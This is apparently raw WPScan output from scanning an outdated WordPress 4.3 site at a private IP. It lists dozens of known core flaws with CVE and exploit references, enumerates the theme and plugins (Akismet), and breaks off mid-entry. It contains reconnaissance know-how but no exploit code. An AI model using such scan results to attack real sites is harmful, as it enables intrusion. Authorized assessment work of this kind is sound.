 | [!] Title: WordPress <= 5.0 - Authenticated Cross-Site Scripting (XSS)
 |     Fixed in: 4.3.18
 |     References:
 |      - https://wpscan.com/vulnerability/3182002e-d831-4412-a27d-a5e39bb44314
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20153
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
 | [!] Title: WordPress <= 5.0 - Cross-Site Scripting (XSS) that could affect plugins
 |     Fixed in: 4.3.18
 |     References:
 |      - https://wpscan.com/vulnerability/7f7a0795-4dd7-417d-804e-54f12595d1e4
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20150
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |      - https://github.com/WordPress/WordPress/commit/fb3c6ea0618fcb9a51d4f2c1940e9efcd4a2d460
 |
 | [!] Title: WordPress <= 5.0 - User Activation Screen Search Engine Indexing
 |     Fixed in: 4.3.18
 |     References:
 |      - https://wpscan.com/vulnerability/65f1aec4-6d28-4396-88d7-66702b21c7a2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20151
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
 | [!] Title: WordPress <= 5.0 - File Upload to XSS on Apache Web Servers
 |     Fixed in: 4.3.18
 |     References:
 |      - https://wpscan.com/vulnerability/d741f5ae-52ca-417d-a2ca-acdfb7ca5808
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20149
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |      - https://github.com/WordPress/WordPress/commit/246a70bdbfac3bd45ff71c7941deef1bb206b19a
 |
 | [!] Title: WordPress 3.7-5.0 (except 4.9.9) - Authenticated Code Execution
 |     Fixed in: 5.0.1
 |     References:
 |      - https://wpscan.com/vulnerability/1a693e57-f99c-4df6-93dd-0cdc92fd0526
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8942
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8943
 |      - https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/
 |      - https://www.rapid7.com/db/modules/exploit/multi/http/wp_crop_rce
 |
 |
 | [!] Title: WordPress 3.9-5.1 - Comment Cross-Site Scripting (XSS)
 |     Fixed in: 4.3.19
 |     References:
 |      - https://wpscan.com/vulnerability/d150f43f-6030-4191-98b8-20ae05585936
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9787
 |      - https://github.com/WordPress/WordPress/commit/0292de60ec78c5a44956765189403654fe4d080b
 |      - https://wordpress.org/news/2019/03/wordpress-5-1-1-security-and-maintenance-release/
 |      - https://blog.ripstech.com/2019/wordpress-csrf-to-rce/
 |
 | [!] Title: WordPress <= 5.2.2 - Cross-Site Scripting (XSS) in URL Sanitisation
 |     Fixed in: 4.3.20
 |     References:
 |      - https://wpscan.com/vulnerability/4494a903-5a73-4cad-8c14-1e7b4da2be61
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16222
 |      - https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/30ac67579559fe42251b5a9f887211bf61a8ed68
 |      - https://hackerone.com/reports/339483
 |
 | [!] Title: WordPress <= 5.2.3 - Stored XSS in Customizer
 |     Fixed in: 4.3.21
 |     References:
 |      - https://wpscan.com/vulnerability/d39a7b84-28b9-4916-a2fc-6192ceb6fa56
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17674
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [!] Title: WordPress <= 5.2.3 - Unauthenticated View Private/Draft Posts
 |     Fixed in: 4.3.21
 |     References:
 |      - https://wpscan.com/vulnerability/3413b879-785f-4c9f-aa8a-5a4a1d5e0ba2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17671
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |      - https://github.com/WordPress/WordPress/commit/f82ed753cf00329a5e41f2cb6dc521085136f308
 |      - https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/
 |
 | [!] Title: WordPress <= 5.2.3 - Stored XSS in Style Tags
 |     Fixed in: 4.3.21
 |     References:
 |      - https://wpscan.com/vulnerability/d005b1f8-749d-438a-8818-21fba45c6465
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17672
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [!] Title: WordPress <= 5.2.3 - JSON Request Cache Poisoning
 |     Fixed in: 4.3.21
 |     References:
 |      - https://wpscan.com/vulnerability/7804d8ed-457a-407e-83a7-345d3bbe07b2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17673
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://github.com/WordPress/WordPress/commit/b224c251adfa16a5f84074a3c0886270c9df38de
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [!] Title: WordPress <= 5.2.3 - Server-Side Request Forgery (SSRF) in URL Validation 
 |     Fixed in: 4.3.21
 |     References:
 |      - https://wpscan.com/vulnerability/26a26de2-d598-405d-b00c-61f71cfacff6
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17669
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17670
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://github.com/WordPress/WordPress/commit/9db44754b9e4044690a6c32fd74b9d5fe26b07b2
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [!] Title: WordPress <= 5.2.3 - Admin Referrer Validation
 |     Fixed in: 4.3.21
 |     References:
 |      - https://wpscan.com/vulnerability/715c00e3-5302-44ad-b914-131c162c3f71
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17675
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://github.com/WordPress/WordPress/commit/b183fd1cca0b44a92f0264823dd9f22d2fd8b8d0
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [!] Title: WordPress <= 5.3 - Authenticated Improper Access Controls in REST API
 |     Fixed in: 4.3.22
 |     References:
 |      - https://wpscan.com/vulnerability/4a6de154-5fbd-4c80-acd3-8902ee431bd8
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-20043
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16788
 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-g7rg-hchx-c2gw
 |
 | [!] Title: WordPress <= 5.3 - Authenticated Stored XSS via Crafted Links
 |     Fixed in: 4.3.22
 |     References:
 |      - https://wpscan.com/vulnerability/23553517-34e3-40a9-a406-f3ffbe9dd265
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-20042
 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
 |      - https://hackerone.com/reports/509930
 |      - https://github.com/WordPress/wordpress-develop/commit/1f7f3f1f59567e2504f0fbebd51ccf004b3ccb1d
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-xvg2-m2f4-83m7
 |
 | [!] Title: WordPress <= 5.3 - Authenticated Stored XSS via Block Editor Content
 |     Fixed in: 4.3.22
 |     References:
 |      - https://wpscan.com/vulnerability/be794159-4486-4ae1-a5cc-5c190e5ddf5f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16781
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16780
 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-pg4x-64rh-3c9v
 |
 | [!] Title: WordPress <= 5.3 - wp_kses_bad_protocol() Colon Bypass
 |     Fixed in: 4.3.22
 |     References:
 |      - https://wpscan.com/vulnerability/8fac612b-95d2-477a-a7d6-e5ec0bb9ca52
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-20041
 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/b1975463dd995da19bb40d3fa0786498717e3c53
 |
 | [!] Title: WordPress < 5.4.1 - Password Reset Tokens Failed to Be Properly Invalidated
 |     Fixed in: 4.3.23
 |     References:
 |      - https://wpscan.com/vulnerability/7db191c0-d112-4f08-a419-a1cd81928c4e
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11027
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47634/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-ww7v-jg8c-q6jw
 |
 | [!] Title: WordPress < 5.4.1 - Unauthenticated Users View Private Posts
 |     Fixed in: 4.3.23
 |     References:
 |      - https://wpscan.com/vulnerability/d1e1ba25-98c9-4ae7-8027-9632fb825a56
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11028
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47635/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-xhx9-759f-6p2w
 |
 | [!] Title: WordPress < 5.4.1 - Authenticated Cross-Site Scripting (XSS) in Customizer
 |     Fixed in: 4.3.23
 |     References:
 |      - https://wpscan.com/vulnerability/4eee26bd-a27e-4509-a3a5-8019dd48e429
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11025
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47633/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-4mhg-j6fx-5g3c
 |
 | [!] Title: WordPress < 5.4.1 - Cross-Site Scripting (XSS) in wp-object-cache
 |     Fixed in: 4.3.23
 |     References:
 |      - https://wpscan.com/vulnerability/e721d8b9-a38f-44ac-8520-b4a9ed6a5157
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11029
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47637/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-568w-8m88-8g2c
 |
 | [!] Title: WordPress < 5.4.1 - Authenticated Cross-Site Scripting (XSS) in File Uploads
 |     Fixed in: 4.3.23
 |     References:
 |      - https://wpscan.com/vulnerability/55438b63-5fc9-4812-afc4-2f1eff800d5f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11026
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47638/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-3gw2-4656-pfr2
 |      - https://hackerone.com/reports/179695
 |
 | [!] Title: WordPress <= 5.2.3 - Hardening Bypass
 |     Fixed in: 4.3.21
 |     References:
 |      - https://wpscan.com/vulnerability/378d7df5-bce2-406a-86b2-ff79cd699920
 |      - https://blog.ripstech.com/2020/wordpress-hardening-bypass/
 |      - https://hackerone.com/reports/436928
 |      - https://wordpress.org/news/2019/11/wordpress-5-2-4-update/
 |
 | [!] Title: WordPress < 5.4.2 - Authenticated XSS via Media Files
 |     Fixed in: 4.3.24
 |     References:
 |      - https://wpscan.com/vulnerability/741d07d1-2476-430a-b82f-e1228a9343a4
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-4047
 |      - https://wordpress.org/news/2020/06/wordpress-5-4-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-8q2w-5m27-wm27
 |
 | [!] Title: WordPress < 5.4.2 - Open Redirection
 |     Fixed in: 4.3.24
 |     References:
 |      - https://wpscan.com/vulnerability/12855f02-432e-4484-af09-7d0fbf596909
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-4048
 |      - https://wordpress.org/news/2020/06/wordpress-5-4-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/10e2a50c523cf0b9785555a688d7d36a40fbeccf
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-q6pw-gvf4-5fj5
 |
 | [!] Title: WordPress < 5.4.2 - Authenticated Stored XSS via Theme Upload
 |     Fixed in: 4.3.24
 |     References:
 |      - https://wpscan.com/vulnerability/d8addb42-e70b-4439-b828-fd0697e5d9d4
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-4049
 |      - https://www.exploit-db.com/exploits/48770/
 |      - https://wordpress.org/news/2020/06/wordpress-5-4-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-87h4-phjv-rm6p
 |      - https://hackerone.com/reports/406289
 |
 | [!] Title: WordPress < 5.4.2 - Misuse of set-screen-option Leading to Privilege Escalation
 |     Fixed in: 4.3.24
 |     References:
 |      - https://wpscan.com/vulnerability/b6f69ff1-4c11-48d2-b512-c65168988c45
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-4050
 |      - https://wordpress.org/news/2020/06/wordpress-5-4-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/dda0ccdd18f6532481406cabede19ae2ed1f575d
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-4vpv-fgg2-gcqc
 |
 | [!] Title: WordPress < 5.4.2 - Disclosure of Password-Protected Page/Post Comments
 |     Fixed in: 4.3.24
 |     References:
 |      - https://wpscan.com/vulnerability/eea6dbf5-e298-44a7-9b0d-f078ad4741f9
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-25286
 |      - https://wordpress.org/news/2020/06/wordpress-5-4-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/c075eec24f2f3214ab0d0fb0120a23082e6b1122
 |
 | [!] Title: WordPress 3.7 to 5.7.1 - Object Injection in PHPMailer
 |     Fixed in: 4.3.26
 |     References:
 |      - https://wpscan.com/vulnerability/4cd46653-4470-40ff-8aac-318bee2f998d
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-36326
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-19296
 |      - https://github.com/WordPress/WordPress/commit/267061c9595fedd321582d14c21ec9e7da2dcf62
 |      - https://wordpress.org/news/2021/05/wordpress-5-7-2-security-release/
 |      - https://github.com/PHPMailer/PHPMailer/commit/e2e07a355ee8ff36aba21d0242c5950c56e4c6f9
 |      - https://www.wordfence.com/blog/2021/05/wordpress-5-7-2-security-release-what-you-need-to-know/
 |      - https://www.youtube.com/watch?v=HaW15aMzBUM
 |
 | [!] Title: WordPress < 5.8 - Plugin Confusion
 |     Fixed in: 5.8
 |     References:
 |      - https://wpscan.com/vulnerability/95e01006-84e4-4e95-b5d7-68ea7b5aa1a8
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44223
 |      - https://vavkamil.cz/2021/11/25/wordpress-plugin-confusion-update-can-get-you-pwned/
 |
 | [!] Title: WordPress < 5.8.3 - SQL Injection via WP_Query
 |     Fixed in: 4.3.27
 |     References:
 |      - https://wpscan.com/vulnerability/7f768bcf-ed33-4b22-b432-d1e7f95c1317
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21661
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-6676-cqfm-gw84
 |      - https://hackerone.com/reports/1378209
 |
 | [!] Title: WordPress < 5.8.3 - Author+ Stored XSS via Post Slugs
 |     Fixed in: 4.3.27
 |     References:
 |      - https://wpscan.com/vulnerability/dc6f04c2-7bf2-4a07-92b5-dd197e4d94c8
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21662
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-699q-3hj9-889w
 |      - https://hackerone.com/reports/425342
 |      - https://blog.sonarsource.com/wordpress-stored-xss-vulnerability
 |
 | [!] Title: WordPress 4.1-5.8.2 - SQL Injection via WP_Meta_Query
 |     Fixed in: 4.3.27
 |     References:
 |      - https://wpscan.com/vulnerability/24462ac4-7959-4575-97aa-a6dcceeae722
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21664
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-jp3p-gw8h-6x86
 |
 | [!] Title: WordPress < 5.8.3 - Super Admin Object Injection in Multisites
 |     Fixed in: 4.3.27
 |     References:
 |      - https://wpscan.com/vulnerability/008c21ab-3d7e-4d97-b6c3-db9d83f390a7
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21663
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-jmmq-m8p8-332h
 |      - https://hackerone.com/reports/541469
 |
 | [!] Title: WordPress < 5.9.2 - Prototype Pollution in jQuery
 |     Fixed in: 4.3.28
 |     References:
 |      - https://wpscan.com/vulnerability/1ac912c1-5e29-41ac-8f76-a062de254c09
 |      - https://wordpress.org/news/2022/03/wordpress-5-9-2-security-maintenance-release/
 |
 | [!] Title: WP < 6.0.2 - Reflected Cross-Site Scripting
 |     Fixed in: 4.3.29
 |     References:
 |      - https://wpscan.com/vulnerability/622893b0-c2c4-4ee7-9fa1-4cecef6e36be
 |      - https://wordpress.org/news/2022/08/wordpress-6-0-2-security-and-maintenance-release/
 |
 | [!] Title: WP < 6.0.2 - Authenticated Stored Cross-Site Scripting
 |     Fixed in: 4.3.29
 |     References:
 |      - https://wpscan.com/vulnerability/3b1573d4-06b4-442b-bad5-872753118ee0
 |      - https://wordpress.org/news/2022/08/wordpress-6-0-2-security-and-maintenance-release/
 |
 | [!] Title: WP < 6.0.2 - SQLi via Link API
 |     Fixed in: 4.3.29
 |     References:
 |      - https://wpscan.com/vulnerability/601b0bf9-fed2-4675-aec7-fed3156a022f
 |      - https://wordpress.org/news/2022/08/wordpress-6-0-2-security-and-maintenance-release/
 |
 | [!] Title: WP < 6.0.3 - Stored XSS via wp-mail.php
 |     Fixed in: 4.3.30
 |     References:
 |      - https://wpscan.com/vulnerability/713bdc8b-ab7c-46d7-9847-305344a579c4
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/abf236fdaf94455e7bc6e30980cf70401003e283
 |
 | [!] Title: WP < 6.0.3 - Open Redirect via wp_nonce_ays
 |     Fixed in: 4.3.30
 |     References:
 |      - https://wpscan.com/vulnerability/926cd097-b36f-4d26-9c51-0dfab11c301b
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/506eee125953deb658307bb3005417cb83f32095
 |
 | [!] Title: WP < 6.0.3 - Email Address Disclosure via wp-mail.php
 |     Fixed in: 4.3.30
 |     References:
 |      - https://wpscan.com/vulnerability/c5675b59-4b1d-4f64-9876-068e05145431
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/5fcdee1b4d72f1150b7b762ef5fb39ab288c8d44
 |
 | [!] Title: WP < 6.0.3 - Reflected XSS via SQLi in Media Library
 |     Fixed in: 4.3.30
 |     References:
 |      - https://wpscan.com/vulnerability/cfd8b50d-16aa-4319-9c2d-b227365c2156
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/8836d4682264e8030067e07f2f953a0f66cb76cc
 |
 | [!] Title: WP < 6.0.3 - CSRF in wp-trackback.php
 |     Fixed in: 4.3.30
 |     References:
 |      - https://wpscan.com/vulnerability/b60a6557-ae78-465c-95bc-a78cf74a6dd0
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/a4f9ca17fae0b7d97ff807a3c234cf219810fae0
 |
 | [!] Title: WP < 6.0.3 - Stored XSS via the Customizer
 |     Fixed in: 4.3.30
 |     References:
 |      - https://wpscan.com/vulnerability/2787684c-aaef-4171-95b4-ee5048c74218
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/2ca28e49fc489a9bb3c9c9c0d8907a033fe056ef
 |
 | [!] Title: WP < 6.0.3 - Stored XSS via Comment Editing
 |     Fixed in: 4.3.30
 |     References:
 |      - https://wpscan.com/vulnerability/02d76d8e-9558-41a5-bdb6-3957dc31563b
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/89c8f7919460c31c0f259453b4ffb63fde9fa955
 |
 | [!] Title: WP < 6.0.3 - Content from Multipart Emails Leaked
 |     Fixed in: 4.3.30
 |     References:
 |      - https://wpscan.com/vulnerability/3f707e05-25f0-4566-88ed-d8d0aff3a872
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/3765886b4903b319764490d4ad5905bc5c310ef8
 |
 | [!] Title: WP < 6.0.3 - SQLi in WP_Date_Query
 |     Fixed in: 4.3.30
 |     References:
 |      - https://wpscan.com/vulnerability/1da03338-557f-4cb6-9a65-3379df4cce47
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/d815d2e8b2a7c2be6694b49276ba3eee5166c21f
 |
 | [!] Title: WP < 6.0.3 - Stored XSS via RSS Widget
 |     Fixed in: 4.3.30
 |     References:
 |      - https://wpscan.com/vulnerability/58d131f5-f376-4679-b604-2b888de71c5b
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/929cf3cb9580636f1ae3fe944b8faf8cca420492
 |
 | [!] Title: WP < 6.0.3 - Data Exposure via REST Terms/Tags Endpoint
 |     Fixed in: 4.3.30
 |     References:
 |      - https://wpscan.com/vulnerability/b27a8711-a0c0-4996-bd6a-01734702913e
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/ebaac57a9ac0174485c65de3d32ea56de2330d8e
 |
 | [!] Title: WP < 6.0.3 - Multiple Stored XSS via Gutenberg
 |     Fixed in: 4.3.30
 |     References:
 |      - https://wpscan.com/vulnerability/f513c8f6-2e1c-45ae-8a58-36b6518e2aa9
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/gutenberg/pull/45045/files
 |
 | [!] Title: WP <= 6.2 - Unauthenticated Blind SSRF via DNS Rebinding
 |     References:
 |      - https://wpscan.com/vulnerability/c8814e6e-78b3-4f63-a1d3-6906a84c1f11
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-3590
 |      - https://blog.sonarsource.com/wordpress-core-unauthenticated-blind-ssrf/
 |
 | [!] Title: WP < 6.2.1 - Directory Traversal via Translation Files
 |     Fixed in: 4.3.31
 |     References:
 |      - https://wpscan.com/vulnerability/2999613a-b8c8-4ec0-9164-5dfe63adf6e6
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-2745
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/
 |
 | [!] Title: WP < 6.2.1 - Thumbnail Image Update via CSRF
 |     Fixed in: 4.3.31
 |     References:
 |      - https://wpscan.com/vulnerability/a03d744a-9839-4167-a356-3e7da0f1d532
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/
 |
 | [!] Title: WP < 6.2.1 - Contributor+ Stored XSS via Open Embed Auto Discovery
 |     Fixed in: 4.3.31
 |     References:
 |      - https://wpscan.com/vulnerability/3b574451-2852-4789-bc19-d5cc39948db5
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/
 |
 | [!] Title: WP < 6.2.2 - Shortcode Execution in User Generated Data
 |     Fixed in: 4.3.31
 |     References:
 |      - https://wpscan.com/vulnerability/ef289d46-ea83-4fa5-b003-0352c690fd89
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-2-security-release/
 |
 | [!] Title: WP < 6.2.1 - Contributor+ Content Injection
 |     Fixed in: 4.3.31
 |     References:
 |      - https://wpscan.com/vulnerability/1527ebdb-18bc-4f9d-9c20-8d729a628670
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/
 |
 | [!] Title: WP < 6.3.2 - Subscriber+ Arbitrary Shortcode Execution
 |     Fixed in: 4.3.22
 |     References:
 |      - https://wpscan.com/vulnerability/3615aea0-90aa-4f9a-9792-078a90af7f59
 |      - https://wordpress.org/news/2023/10/wordpress-6-3-2-maintenance-and-security-release/
 |
 | [!] Title: WP < 6.3.2 - Contributor+ Comment Disclosure
 |     Fixed in: 4.3.22
 |     References:
 |      - https://wpscan.com/vulnerability/d35b2a3d-9b41-4b4f-8e87-1b8ccb370b9f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-39999
 |      - https://wordpress.org/news/2023/10/wordpress-6-3-2-maintenance-and-security-release/
 |
 | [!] Title: WordPress < 6.4.3 - Deserialization of Untrusted Data
 |     Fixed in: 4.3.33
 |     References:
 |      - https://wpscan.com/vulnerability/5e9804e5-bbd4-4836-a5f0-b4388cc39225
 |      - https://wordpress.org/news/2024/01/wordpress-6-4-3-maintenance-and-security-release/
 |
 | [!] Title: WordPress < 6.4.3 - Admin+ PHP File Upload
 |     Fixed in: 4.3.33
 |     References:
 |      - https://wpscan.com/vulnerability/a8e12fbe-c70b-4078-9015-cf57a05bdd4a
 |      - https://wordpress.org/news/2024/01/wordpress-6-4-3-maintenance-and-security-release/
 |
 | [!] Title: WordPress < 6.5.5 - Contributor+ Stored XSS in HTML API
 |     Fixed in: 4.3.34
 |     References:
 |      - https://wpscan.com/vulnerability/2c63f136-4c1f-4093-9a8c-5e51f19eae28
 |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/
 |
 | [!] Title: WordPress < 6.5.5 - Contributor+ Stored XSS in Template-Part Block
 |     Fixed in: 4.3.34
 |     References:
 |      - https://wpscan.com/vulnerability/7c448f6d-4531-4757-bff0-be9e3220bbbb
 |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/
 |
 | [!] Title: WordPress < 6.5.5 - Contributor+ Path Traversal in Template-Part Block
 |     Fixed in: 4.3.34
 |     References:
 |      - https://wpscan.com/vulnerability/36232787-754a-4234-83d6-6ded5e80251c
 |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/

[+] WordPress theme in use: twentyfifteen
 | Location: https://192.168.1.6/wp-content/themes/twentyfifteen/
 | Last Updated: 2026-05-20T00:00:00.000Z
 | Readme: https://192.168.1.6/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 4.2
 | Style URL: https://192.168.1.6/wp-content/themes/twentyfifteen/style.css?ver=4.3.1
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen/
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - https://192.168.1.6/wp-content/themes/twentyfifteen/style.css?ver=4.3.1, Match: 'Version: 1.3'

[+] Enumerating All Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 03:23:20 <=======================================================================> (134512 / 134512) 100.00% Time: 03:23:20
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] akismet
 | Location: https://192.168.1.6/wp-content/plugins/akismet/
 | Latest Version: 5.7.2
 | Last Updated: 2026-08-18T23:42:00.000Z
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - https://192.168.1.6/wp-content/plugins/akismet/, status: 403
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: Akismet 2.5.0-3.1.4 - Unauthenticated Stored Cross-Site Scripting (XSS)
 |     Fixed in: 3.1.5
 |     References:
